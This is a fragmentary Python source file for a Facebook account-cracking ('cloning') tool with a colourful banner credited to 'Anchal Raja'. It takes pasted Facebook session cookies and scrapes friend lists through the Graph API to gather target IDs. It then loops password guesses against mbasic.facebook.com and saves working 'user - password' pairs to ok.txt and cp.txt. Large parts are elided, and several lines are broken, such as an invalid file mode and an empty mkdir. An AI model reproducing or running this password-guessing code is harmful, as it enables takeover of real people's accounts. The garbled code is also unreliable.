...
def main():
    ...
    print('\033[1;32m┌────────────────────────────────────────────┐') 
    print('\033[1;92m│\033[1;92m[01] \033[1;93mFile Cloning   \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m] \033[1;31m(\033[1;32mFAST\033[1;31m) \033[1;32m │ ')
    print('\033[1;92m│\033[1;92m[02] \033[1;93mFile Cloning   \033[1;37m[\033[1;32mONLY OK IDS  \033[1;37m] \033[1;31m(\033[1;32mSLOW\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;92m[03] \033[1;93mPublic Cloning \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m]\033[1;31m (\033[1;32mFAST\033[1;31m) \033[1;32m │')
    print('\033[1;92m│\033[1;92m[04] \033[1;93mCreate File \033[1;92m                           │')
    print('\033[1;92m│\033[1;92m[05] \033[1;93mSEPARATE IDS\033[1;92m                           │ ')
    print('\033[1;92m│\033[1;92m[06] \033[1;93mContact Me \033[1;92m                            │')
    print('\033[1;92m│\033[1;92m[07] \033[1;93mDelete cookie\033[1;92m                          │')
    print('\033[1;92m│\033[1;92m[00] \033[1;93mExit\033[1;92m                                   │ ')
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    psy = input('\033[1;37m[+] \033[1;32m Celect Option : ')
    if psy in ('1', '01'):
        __crack__().plerr()
    if psy in ('2', '02'):
    ...
    if psy in ('7', '07'):
        time.sleep(2)
        os.system('clear');print(banner);print(' Removing Cookie .');time.sleep(1);os.system('clear');print(banner);print(' Removing cookies ..');time.sleep(1);os.system('clear');print(banner);print(' Removing cookies ...');time.sleep(2);os.system('clear');print(banner);print('\033[1;91mToken Removed\033[0m');time.sleep(3);os.system('rm -rf access_cookies.txt'); version()
    if psy in ('0', '00'):
        exit('Thanks For Using Anchal Raja Tool')  
    else:
...
def login():
    os.system('clear');print(banner)
    tok = input('\033[1;37m[+]  \033[1;92mPutt Access cookies\033[1;31m : \033[1;32m')
    if 'datr' in tok:
        pass
    else:
        print('  \033[1;37mOnly fb ads access cookies can be used for scraping data')
        print('  \033[1;37mCheck main menu for creating fb ads access cookies....o')
        os.sys.exit()
    try:
        requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_cookies.txt', 'd')
        ts.write(tok)
        ts.close()
        ...
        print('\n\033[1;91m  Invalid cookies provided, try again  ')
        time.sleep(1)
        login()      
def banner():
	print(banner)
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPSYCHO\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m]\033[1;32mCP-{len(cp)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mRAJA-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mRAJA-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;37m [1] \033[1;92mMethod FAST ")
		print ("\033[1;37m [2] \033[1;92mMethod NORMEL ")
		print ("\033[1;37m [3] \033[1;92mMethod MEDIUM ")
		print(50*"\033[1;97m_")
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					pass
				print('\r\033[1;91m[RAJA-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    print(50*"\033[1;97m_")
    _Adi__ = input('\033[1;37m[+] \033[1;32m Select Option : ')
    if _Adi__ in ('1', '01'):
        __cracking__().plerr()
    if _Adi__ in ('0', '00'):
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;31m[\033[1;91mRAJA-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
def create_file():
    ...
    for ids in fileidopen:
        try:
            tfile = open('access_cookies.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_cookies='+tfile).text
            rgq = json.loads(rg)
...
class load:
    def __init__(self):
        ...
        print('\n')
banner = """
  \033[0;91m_______         _          _____     _       
  \033[0;92m|_   _ \       / \        |_   _|   / \      
  \033[0;93m| |__) |      / _ \         | |    / _ \     
  \033[0;94m|  __ /      / ___ \    _   | |   / ___ \    
 \033[0;95m_| |  \ \_  _/ /   \ \_ | |__' | _/ /   \ \_  
\033[0;96m|____| |___||____| |____|`.____.'|____| |____| 
                                               
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m ANCHAL~ RAJA│\033[1;37m• \033[1;36mTHIS Tool Is Free \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m ANCHAL~ RAJA│\033[1;37m• \033[1;36mOnly In Package   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m 09149858868  │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m ANCHAL~ RAJA│\033[1;37m  • \033[1;36mPrice \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│\33[37;41m\t • 𝐖𝐄𝐋𝐋𝐂𝐎𝐌 𝐓𝐎 𝐀𝐍𝐂𝐇𝐀𝐋 𝐑𝐀𝐉𝐀 𝐓𝐎𝐎𝐋  • \033[1;37m\33[0;m 
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
